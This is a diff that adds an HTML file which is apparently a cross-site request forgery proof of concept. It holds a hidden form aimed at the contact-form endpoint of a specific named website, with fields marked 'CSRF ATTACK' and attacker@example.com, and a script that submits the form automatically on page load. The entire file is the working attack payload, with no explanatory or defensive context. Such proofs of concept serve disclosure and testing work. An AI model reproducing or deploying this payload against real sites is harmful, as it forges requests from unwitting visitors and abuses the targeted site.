@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://www.thames-park.osborne.coop/inc/ajax/post.php" method="POST">
+      <input type="hidden" name="field_1" value="CSRF ATTACK">
+      <input type="hidden" name="field_2" value="+447000000000">
+      <input type="hidden" name="field_3" value="attacker@example.com">
+      <input type="hidden" name="field_4" value="This was sent via CSRF.">
+      <input type="hidden" name="form_act" value="form1">
+      <input type="hidden" name="page_id" value="487">
+      <input type="hidden" name="page_title" value="Contact Us">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
